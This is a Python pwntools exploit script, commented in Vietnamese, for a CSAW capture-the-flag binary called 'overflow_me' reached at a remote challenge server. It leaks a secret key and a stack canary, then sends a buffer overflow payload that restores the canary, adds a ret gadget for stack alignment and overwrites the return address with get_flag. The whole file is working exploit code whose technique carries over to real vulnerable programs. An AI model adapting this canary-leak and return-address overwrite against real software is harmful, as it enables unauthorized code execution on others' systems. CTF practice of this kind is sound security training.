#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./overflow_me', checksec=False)
p = remote('chals.ctf.csaw.io', 21006)

# =============================================================================
# --- GIAI ĐOẠN 1: LEAK SECRET_KEY & CANARY ---
# =============================================================================

# Logic này đã được xác nhận là hoàn toàn chính xác.
secret_key_addr = elf.symbols['secret_key']
p.recvuntil(b'Tell me its address\n')
p.send(p64(secret_key_addr))
leaked_secret_key = int(p.recvline().strip(), 16)

p.recvuntil(b'the story unlocks\n')
p.send(p64(leaked_secret_key))
log.info("Đã gửi secret_key, đang vào hàm get_input...")

p.recvuntil(b'for you: 0x')
leaked_canary = int(p.recvline().strip(), 16)
log.success(f"Leak được secret_key: {hex(leaked_secret_key)}")
log.success(f"Leak được CANARY: {hex(leaked_canary)}")


# =============================================================================
# --- GIAI ĐOẠN 2: OVERFLOW VỚI OFFSET CHÍNH XÁC ---
# =============================================================================

# Tìm "ret" gadget để sửa lỗi căn lề stack (luôn là một thói quen tốt)
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret']).address
log.info(f"Tìm thấy ret gadget để căn lề stack tại: {hex(ret_gadget)}")

get_flag_addr = elf.symbols['get_flag']

# Offset từ đầu buffer đến canary
offset_to_canary = 64

# Xây dựng payload cuối cùng và chính xác
payload = b''
# 1. Padding 64 bytes để đến canary
payload += b'A' * offset_to_canary
# 2. Ghi đè canary bằng chính nó
payload += p64(leaked_canary)
# 3. **FIX QUAN TRỌNG**: Padding 16 bytes để ghi đè lên 'local_10' và 'Saved RBP'
payload += b'B' * 16
# 4. Thêm ret gadget để căn lề stack
payload += p64(ret_gadget)
# 5. Ghi đè địa chỉ trả về bằng địa chỉ của get_flag
payload += p64(get_flag_addr)

log.info(f"Payload cuối cùng đã được tạo với độ dài: {len(payload)}")

# Gửi payload
p.recvuntil(b'Write yourself into this story.\n')
p.sendline(payload)
log.success("Payload cuối cùng đã được gửi!")


p.interactive()